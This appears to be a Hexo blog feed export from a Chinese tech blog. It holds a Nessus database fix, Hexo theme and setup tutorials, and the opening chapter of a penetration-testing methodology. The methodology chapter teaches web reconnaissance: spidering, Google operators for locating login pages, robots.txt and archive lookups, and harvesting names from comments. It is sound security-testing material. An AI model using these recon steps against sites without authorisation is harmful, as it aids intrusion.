      <link href="/2019/08/19/nessus%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B4%A9%E6%BA%83%E9%97%AE%E9%A2%98/"/>
      <url>/2019/08/19/nessus%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B4%A9%E6%BA%83%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天想用nessus扫描器扫描一下系统，看看有没有什么漏洞，但是打开浏览器的时候发现，提示数据库崩溃了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819212849.png" class="lozad"></p><p>然后上网百度，貌似在百度贴吧中找到了答案，然后，为了给以后的自己和碰到同样问题的朋友看，我在给大家讲讲吧。</p><a id="more"></a><h1 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01 问题描述"></a>0x01 问题描述</h1><p>在浏览器中打开nessus时，提示下面错误，</p><p>Corrupt Database</p><p>A corrupt database has been detected which prevents Nessus from running. Please take the following corrective actions:</p><p>图片详情</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213106.png" class="lozad"></p><h1 id="0x02-解决方法"><a href="#0x02-解决方法" class="headerlink" title="0x02 解决方法"></a>0x02 解决方法</h1><ol><li><p>按win+R ，输入services.msc</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213150.png" class="lozad"></p></li><li><p>找到tenable nessus服务，右击停止服务</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213227.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213240.png" class="lozad"></p></li><li><p>在nessus的安装目录中，找到global.db文件，直接剪切到桌面或者删掉，或者大家实在找不到该文件的话，可以下载一个everything快速搜索软件，可以快速的搜索到这个软件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213309.png" class="lozad"></p></li><li><p>再次启动nessus服务</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213402.png" class="lozad"></p></li><li><p>刷新浏览器，等舒适化完成，舒服Nessus，Nessus账号密码，成功登陆系统。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213423.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213434.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819213456.png" class="lozad"></p></li></ol><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>出现问题，先不要慌张，因为，你应该不是第一个碰到这个问题的人，so，百度，Google，寻找答案，之所谓：授人予鱼，不如授人于渔。方法告诉你了，下次要记得的多百度寻找答案奥！: D</p><hr>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nessus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一章：应用程序及表单风险（渗透测试方法论）</title>
      <link href="/2019/08/19/%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%8F%8A%E8%A1%A8%E5%8D%95%E9%A3%8E%E9%99%A9/"/>
      <url>/2019/08/19/%E7%AC%AC%E4%B8%80%E7%AB%A0%EF%BC%9A%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%8F%8A%E8%A1%A8%E5%8D%95%E9%A3%8E%E9%99%A9/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>渗透测试对于每个人来说，测试的思路都不一样，但是大体思路还是信息收集-&gt;漏洞扫描-&gt;漏洞利用-&gt;权限提升-&gt;清理痕迹-&gt;输出报告。不过企业中的灰盒测试一般都是主要漏洞挖掘为主，这样的话，就需要有一个测试的方法论在进行测试了。so，这里给大家整理出渗透测试的方法论分享给大家。</p><a id="more"></a><h1 id="0x01-搜索可见的内容"><a href="#0x01-搜索可见的内容" class="headerlink" title="0x01 搜索可见的内容"></a>0x01 搜索可见的内容</h1><p>一般情况下，手动浏览就可以确定应用程序的大部分内容和功能。浏览应用程序的基本方法是从初始页面开始，依次浏览每一个链接和所有的多阶段功能。但是为了仔细检查枚举的内容，全面记录每一项确定的功能，简单的浏览就不再能满足我们的需求，有必要使用更加先进的工具。</p><p>（1）首先配置浏览器，使用代理工具，可以使用BurpSuite等工具监控和解析由代理服务器处理的Web内容，对站点实行被动抓取。</p><p>首先开启代理，然后打开Burpsuite并找到Target下的Site map</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819220707.png" class="lozad"></p><p>访问目标网站，对其进行自动爬取，由于完全自动化的方法在内容枚举方面还有一定的限制，例如</p><ol><li>身份验证时爬虫的一些操作会让通过验证的会话中断；</li><li>向某个敏感内容提交无效输入，应用程序可能会自我防御，终止会话；</li><li>多阶段功能往往会严格的执行输入确认检查，可能不会接受自动工具提交的值；</li><li>爬虫可能会发现并使用敏感功能，造成重大损失等等。</li></ol><p>所以更多的时候我们选择进行指定爬取，即用户通过常规方式浏览应用程序，来枚举应用程序的所有功能，生成的流量穿过一个组合拦截代理服务器与爬虫的工具，监控所有请求和响应，并且像一个正常的应用程序感知爬虫那样来分析应用程序的响应，BurpSuite中的爬虫就有这种用途。</p><p>（3）接下来进行指定爬取</p><p>​         以常规方式浏览整个应用程序，访问发现的每一个url，提交每一个表单并执行全部多阶段功能，尝试在JavaScript激活与禁用、cookie激活与禁用的情况下浏览。</p><p>如何禁用cookie</p><p>​         打开设置，找到Privacy，点击Firefox will右边的下拉菜单，选择use custom settings for history，然后将Accept cookies from sites前面的√去掉</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820000246.png" class="lozad"></p><p>如何禁用JavaScript</p><p>​         在地址栏输入about:config，点击 I accept the risk！</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820000228.png" class="lozad"></p><p>搜索javascript，找到javascript.enable，双击关闭</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820000328.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820000341.png" class="lozad"></p><p>4）完成手动浏览和被动抓取以后，可以用一组发现的url作为种子，使用爬虫抓取应用程序。有时候这样可以发现其他在手动浏览时忽略的内容。在进行自动抓取前，首先应确定任何危险的或可能会中断应用程序会话的url，并配置爬虫，将它们排除在抓取范围之外。</p><blockquote><p>PS：许多Web服务器的根目录下有一个名为robots.txt的文件，其中列出了站点不希望Web爬虫访问或搜索引擎列入索引的url。有时候这个文件中可能会包含一些敏感信息，这些信息很可能会危机Web程序的安全。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820000432.png" class="lozad"></p></blockquote><h1 id="0x02-浏览公共资源"><a href="#0x02-浏览公共资源" class="headerlink" title="0x02 浏览公共资源"></a>0x02 浏览公共资源</h1><p>（1）使用因特网搜索引擎和历史档案，确定它们编入索引或保存的与目标应用程序有关的内容。</p><p>例如使用Wayback Machine查看历史档案</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820174711.png" class="lozad"></p><p>随便搜索一个网站，就用我们团队的网站来测试，可以看到不同的时间节点有保存的快照信息。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820175553.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820175921.png" class="lozad"></p><p>使用<strong>高级搜索</strong>提高效率。例如，在<code>Google</code>中，可以使用<code>site:</code>获取所有与目标站点有关的内容，使用<code>link:</code>获取链接到目标站点的其他站点。如果在搜索过程中找到现有应用程序已经删除的内容，仍然可以从搜索引擎的缓存中查看这些内容。这些已经被删除的内容中可能包含尚未删除的其他资源的链接。</p><p>使用<code>site: 目标站点</code>进行搜索</p><p><code>site:www.baidu.com</code>将返回Google引用的每一个目标站点的资源</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820180212.png" class="lozad"></p><p>site:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>  inurl:login将返回所有包含login表达式的页面。在大型且复杂的应用程序中，可以快速定位感兴趣的资源，如管理菜单、密码重置等功能</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820180437.png" class="lozad"></p><p>使用link:进行搜索</p><p>link:<a href="http://www.wandouxueyuan.com返回其他Web站点和应用程序中所有包含目标站点的链接的页面，其中包括过去内容的链接或仅第三方可用的功能。" target="_blank" rel="noopener">www.wandouxueyuan.com返回其他Web站点和应用程序中所有包含目标站点的链接的页面，其中包括过去内容的链接或仅第三方可用的功能。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820181209.png" class="lozad"></p><p>使用related进行搜索</p><p>related:<a href="http://www.tencent.com它将返回与目标站点“相似”的页面，可能会包含大量的无关资料，但是也可能包含在其他站点与目标有关的讨论，可能会有所帮助。" target="_blank" rel="noopener">www.tencent.com它将返回与目标站点“相似”的页面，可能会包含大量的无关资料，但是也可能包含在其他站点与目标有关的讨论，可能会有所帮助。</a></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820181233.png" class="lozad"></p><p>（3）搜索在应用程序内容[如联系信息，包括并未在屏幕上显示的内容(如HTML注释)]中发现的任何姓名与电子邮件地址。除Web搜索外，还应进行新闻和分组搜索。在论坛上寻找与目标应用程序及其支持基础架构有关的所有技术信息。</p><p>此处使用evilscience靶机作为检索对象</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820181305.png" class="lozad"></p><p>在这个网站中有很多的注释，当然这些注释没有什么用，此处只是为了演示</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820181324.png" class="lozad"></p><p>在一些安全性不是很强的网站里面还会直接找到用户名</p><p>例如：<img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820181345.png" class="lozad"></p><p>新闻搜索：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190820181406.png" class="lozad"></p><p>（4）检查已发布的任何WSDL文件，以生成应用程序可能采用的功能名称和参数值列表。</p><h1 id="0x03-发现隐藏内容"><a href="#0x03-发现隐藏内容" class="headerlink" title="0x03 发现隐藏内容"></a>0x03 发现隐藏内容</h1><h1 id="0x04-查找默认的内容"><a href="#0x04-查找默认的内容" class="headerlink" title="0x04 查找默认的内容"></a>0x04 查找默认的内容</h1><h1 id="0x05-枚举标识符制定的功能"><a href="#0x05-枚举标识符制定的功能" class="headerlink" title="0x05 枚举标识符制定的功能"></a>0x05 枚举标识符制定的功能</h1><h1 id="0x06-调试参数"><a href="#0x06-调试参数" class="headerlink" title="0x06 调试参数"></a>0x06 调试参数</h1><h1 id="0x07-调试参数"><a href="#0x07-调试参数" class="headerlink" title="0x07 调试参数"></a>0x07 调试参数</h1><h1 id="0x08-确定数据输入点"><a href="#0x08-确定数据输入点" class="headerlink" title="0x08 确定数据输入点"></a>0x08 确定数据输入点</h1><h1 id="0x09-确定所使用的技术"><a href="#0x09-确定所使用的技术" class="headerlink" title="0x09 确定所使用的技术"></a>0x09 确定所使用的技术</h1><h1 id="0x10-解析受攻击面"><a href="#0x10-解析受攻击面" class="headerlink" title="0x10 解析受攻击面"></a>0x10 解析受攻击面</h1><h1 id="0x11-通过客户端传送数据"><a href="#0x11-通过客户端传送数据" class="headerlink" title="0x11 通过客户端传送数据"></a>0x11 通过客户端传送数据</h1><h1 id="0x12-客户端输入控件"><a href="#0x12-客户端输入控件" class="headerlink" title="0x12 客户端输入控件"></a>0x12 客户端输入控件</h1><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全服务 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试方法论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo蝴蝶主题的一些小功能(跟新中)</title>
      <link href="/2019/08/18/hexo%E8%9D%B4%E8%9D%B6%E4%B8%BB%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%8A%9F%E8%83%BD-%E8%B7%9F%E6%96%B0%E4%B8%AD/"/>
      <url>/2019/08/18/hexo%E8%9D%B4%E8%9D%B6%E4%B8%BB%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E5%8A%9F%E8%83%BD-%E8%B7%9F%E6%96%B0%E4%B8%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在从使用next主题后，因为博客的加载缓慢问题，让我再次放弃的这个主题，而偶然的看到同事使用的<strong>蝴蝶</strong>主题，让我欢喜不已。因为这个主题真的太好看了，一下子吸引了我，而且整个博客加载的速度也是非常的快。不过由图床使用的是GitHub的图床，所有在图片加载这个方面还是有点慢。不过整理影响不是很大。这篇文章来给大家介绍一下，换了<strong>蝴蝶</strong> 主题后的一些小功能细节问题。</p><a id="more"></a><h1 id="0x01-导航栏图标问题"><a href="#0x01-导航栏图标问题" class="headerlink" title="0x01 导航栏图标问题"></a>0x01 导航栏图标问题</h1><p>导航栏栏图片，就是在导航栏的文字前面都有对应的小图标，不知道有没有人和我一样，因为增加了导航栏的功能菜单，但是苦苦的找不到对应的图标，让博客看起来不是很好看。</p><h2 id="效果预览"><a href="#效果预览" class="headerlink" title="效果预览"></a>效果预览</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215702.png" class="lozad"></p><h2 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h2><p>访问<a href="https://www.thinkcmf.com/font/font_awesome/icon/hdd-o" target="_blank" rel="noopener">font_awesome网站</a>，主页如下</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215732.png" class="lozad"></p><p>搜索想要的图标，比如电影</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215746.png" class="lozad"></p><p>复制电影的代码</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215801.png" class="lozad"></p><p>在主题的配置文件下替换掉后面的标识</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215816.png" class="lozad"></p><p>然后刷新一下浏览器就能看到了</p><h2 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215835.png" class="lozad"></p><h1 id="0x02-分类目录二级目录"><a href="#0x02-分类目录二级目录" class="headerlink" title="0x02 分类目录二级目录"></a>0x02 分类目录二级目录</h1><p>不知道大家有没有这样的苦恼，就是在写文章的时候，把很多文章都归类到一个大类中，到最后自己找文章的时候都不太好找，但是如果我们将文章都归类到一个二级分类，然后二级分类在归类到一级分类，这样的话是不是找起来更方便一点尼。</p><h2 id="效果预览-1"><a href="#效果预览-1" class="headerlink" title="效果预览"></a>效果预览</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215849.png" class="lozad"></p><h2 id="实现步骤-1"><a href="#实现步骤-1" class="headerlink" title="实现步骤"></a>实现步骤</h2><p>在每次写文章的时候，categories按照如下格式书写。第一个为一级，第二个为二级。理论上来说，还可以添加3级，4级分类目录，这个根据自己的喜好和实际需求了。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215907.png" class="lozad"></p><p>在每次写文章的时候，categories按照如下格式书写。第一个为一级，第二个为二级。</p><h2 id="效果查看-1"><a href="#效果查看-1" class="headerlink" title="效果查看"></a>效果查看</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215919.png" class="lozad"></p><h1 id="0x03-hexo-部署出现问题"><a href="#0x03-hexo-部署出现问题" class="headerlink" title="0x03 hexo 部署出现问题"></a>0x03 hexo 部署出现问题</h1><p>在使用hexo d或者hexo deploy Mingling 时，发现不能部署。</p><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215934.png" class="lozad"></p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>在博客根目录下，输入<code>npm install --save hexo-deployer-git</code>命令，</p><p>安装完成以后再次之行hexo deploy 一切正常</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819215947.png" class="lozad"></p><h1 id="0x04-关闭page页面或者特定文章的评论"><a href="#0x04-关闭page页面或者特定文章的评论" class="headerlink" title="0x04 关闭page页面或者特定文章的评论"></a>0x04 关闭page页面或者特定文章的评论</h1><p>我们在写文章的时候，经常可能会碰到有些文章不需要增加评论的功能，那怎么去实现尼，其实hexo早就想到这点了，实现很简单，一条命令即可。</p><h2 id="实现步骤-2"><a href="#实现步骤-2" class="headerlink" title="实现步骤"></a>实现步骤</h2><p>只要在文章的md或者page的md文件头中加入comments: false即可</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819220005.png" class="lozad"></p><p>注意：是comments 不是comment，单词别写错，第二个，false前面有一个<strong>空格</strong></p><h1 id="0x05-给Hexo正确添加RSS订阅"><a href="#0x05-给Hexo正确添加RSS订阅" class="headerlink" title="0x05 给Hexo正确添加RSS订阅"></a>0x05 给Hexo正确添加RSS订阅</h1><h2 id="安装feed插件"><a href="#安装feed插件" class="headerlink" title="安装feed插件"></a>安装feed插件</h2><p>在博客的根目录下输入<code>npm install hexo-generator-feed</code>命令安装，然后等待安装完成</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819220017.png" class="lozad"></p><h2 id="添加配置文件"><a href="#添加配置文件" class="headerlink" title="添加配置文件"></a>添加配置文件</h2><p>打开站点配置文件_config.yml，末尾添加以下配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: http://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">#RSS订阅</span></span><br><span class="line">plugin:</span><br><span class="line">- hexo-generator-feed</span><br><span class="line"><span class="comment">#Feed Atom</span></span><br><span class="line">feed:</span><br><span class="line">type: atom</span><br><span class="line">path: atom.xml</span><br><span class="line">limit: <span class="number">20</span></span><br></pre></td></tr></table></figure><p>打开主题配置文件_config.yml，按Ctrl+F 搜索rss，添加配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rss: /atom.xml</span><br></pre></td></tr></table></figure><h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><p>输入一下命令，然后刷新一下浏览器即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819220032.png" class="lozad"></p><p><img alt="img" data-src="https://ws1.sinaimg.cn/large/78bb2039ly1g63r98bfavj21gn0nbads.jpg" class="lozad"></p><h1 id="0x06-修改阅读时长，文章热度"><a href="#0x06-修改阅读时长，文章热度" class="headerlink" title="0x06 修改阅读时长，文章热度"></a>0x06 修改阅读时长，文章热度</h1><h2 id="实现步骤-3"><a href="#实现步骤-3" class="headerlink" title="实现步骤"></a>实现步骤</h2><p>Butterfly/languages/zh-CN.yml 下，搜索post，然后按照下图修改即可</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819220053.png" class="lozad"></p><h2 id="效果显示"><a href="#效果显示" class="headerlink" title="效果显示"></a>效果显示</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819220113.png" class="lozad"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 其他文章 </category>
          
          <category> hexo博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 主题功能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2019/08/16/github-hexo-%E5%9F%9F%E5%90%8D%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BD%91%E7%AB%99/"/>
      <url>/2019/08/16/github-hexo-%E5%9F%9F%E5%90%8D%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>title:  github+hexo+域名搭建一个自己的网站<br>tags:  博客<br>copyright:  true<br>rating:  true<br>related_posts:  true<br>date:  2019-08-09 22:36:44<br>permalink:<br>categories: 其他文章</p><p>cover:  <a href="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028165434.png" target="_blank" rel="noopener">https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028165434.png</a></p><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​        在一次无意的搜索文章中，看到了一个特别好的网站，不管是前端还是网站的内容都做的非常吸引人。我一开始以为是WordPress搭建的个人博客，后台得知使用hexo+GitHub来搭建的，顿时心中的博客火又燃了起来。<code>$_$</code>因为我之前也用WordPress搭建过自己的博客，但是由于需要购买阿里云的服务器，这对于我这个穷人来说是一笔开销，所以在服务器到期以后就没有在续费了，而hexo+GitHub搭建的是完全免费的，利用的是GitHub page，然后hexo将我们写的博客渲染成静态页面在部署到GitHub中去，最后在前端展现出来。下面就给大家介绍一个搭建的过程。</p><a id="more"></a><p>#0x01 环境准备</p><blockquote><p>需要的东西：</p><ol><li>node.js</li><li>git</li><li>hexo</li><li>GitHub账号</li><li>域名</li></ol></blockquote><p>##1.1 node和git的安装</p><p>Node.js下载](<a href="http://nodejs.org/" target="_blank" rel="noopener">http://nodejs.org/</a>) ，<a href="http://git-scm.com/" target="_blank" rel="noopener">Git下载</a> ，下载完成以后，直接傻瓜式下一步安装即可。</p><p>按win+R 输入<code>cmd</code>命令来检查是否安装成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v <span class="comment">#查看node版本</span></span><br><span class="line">git -v <span class="comment">#查看git版本</span></span><br></pre></td></tr></table></figure><p>出现下图说明安装成功</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122512.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122527.png" class="lozad"></p><p>##1.2 hexo的安装</p><p>首先需要新建一个空的Blog文件夹，可以在任意盘符右击新建个文件夹，也可以通过cmd命令来完成</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122541.png" class="lozad"></p><p>输入Blog文件夹下输入<code>npm install hexo -g</code>安装<code>hexo</code>（速度根据你的实时网速）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122553.png" class="lozad"></p><p>输入<code>hexo -v</code>，检查<code>hexo</code>是否安装成功</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122605.png" class="lozad"></p><p>输入<code>hexo init</code>，初始化该文件夹（需要等待一会）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122616.png" class="lozad"></p><p>输入<code>npm install</code>，安装所需要的组件</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122629.png" class="lozad"></p><p>输入<code>hexo g</code>（=hexo generate），生成静态页面</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122640.png" class="lozad"></p><p>输入<code>hexo s</code>（=hexo server），开启服务器，访问该网址，正式体验<code>Hexo</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122653.png" class="lozad"></p><p>访问<a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 出现下图，说明本地搭建成功</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122720.png" class="lozad"></p><p>命令总结：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hexo -v <span class="comment">#查看hexo版本</span></span><br><span class="line">hexo init<span class="comment">#初始化hexo</span></span><br><span class="line">hexo install <span class="comment">#安装hexo</span></span><br><span class="line">hexo g<span class="comment">#将文章渲染成静态页面</span></span><br><span class="line">hexo s<span class="comment">#启动本地hexo服务器</span></span><br><span class="line">hexo d  <span class="comment">#部署到GitHub（后面介绍）</span></span><br></pre></td></tr></table></figure><h2 id="1-3-注册GitHub账号"><a href="#1-3-注册GitHub账号" class="headerlink" title="1.3 注册GitHub账号"></a>1.3 注册GitHub账号</h2><p>注册地址：<a href="https://github.com/" target="_blank" rel="noopener">github</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122734.png" class="lozad"></p><p>输入用户名，邮箱和账号密码后点击注册，进入第二步</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122744.png" class="lozad"></p><p>选择免费个人版</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122754.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122805.png" class="lozad"></p><p>去刚刚注册的邮箱验证一下即可</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101122822.png" class="lozad"></p><h2 id="1-4-购买域名"><a href="#1-4-购买域名" class="headerlink" title="1.4 购买域名"></a>1.4 购买域名</h2><p>购买域名是为了将GitHub的默认域名解析到自己的域名下，这样以后就可以直接访问自己的域名了，不需要在输入GitHub的默认域名了。</p><p><a href="https://dnspod.cloud.tencent.com/" target="_blank" rel="noopener">腾讯注册域名传送门</a>  <a href="https://wanwang.aliyun.com" target="_blank" rel="noopener">阿里云注册域名传送门</a></p><h1 id="0x02-搭建hexo博客"><a href="#0x02-搭建hexo博客" class="headerlink" title="0x02 搭建hexo博客"></a>0x02 搭建hexo博客</h1><h2 id="2-1-配置GitHub"><a href="#2-1-配置GitHub" class="headerlink" title="2.1 配置GitHub"></a>2.1 配置GitHub</h2><p>首先需要创建一个新的repository仓库，</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123108.png" class="lozad"></p><p>​    <img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123122.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123138.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123150.png" class="lozad"></p><p>一直往下拉，找到GitHub pages</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123203.png" class="lozad"></p><p>访问链接效果如下：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123214.png" class="lozad"></p><p>将Hexo与Github page联系起来，设置Git的user name和email（如果是第一次的话）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123227.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123240.png" class="lozad"></p><p>分别输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.name <span class="string">"madcoding"</span></span><br><span class="line">git config --<span class="keyword">global</span> user.email <span class="string">"madcoding@163.com"</span></span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123254.png" class="lozad"></p><p><strong>注：这里“madcoding”可以替换成自己的用户名，邮箱可以替换成自己的邮箱</strong></p><p>输入<code>ssh-keygen -t rsa -C “madcoding163.com”</code>连续三个回车，生成密钥，最后得到了两个文件：<code>id_rsa</code>和<code>id_rsa.pub</code>（默认存储路径是：C:\Users\Administrator.ssh）。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123307.png" class="lozad"></p><p>输入<code>eval &quot;$(ssh-agent -s)&quot;</code>，添加密钥到<code>ssh-agent</code></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191101123319.png" class="lozad"></p><p> 再输入ssh-add ~/.ssh/id_rsa，添加生成的SSH key到ssh-agent</p><p><img alt 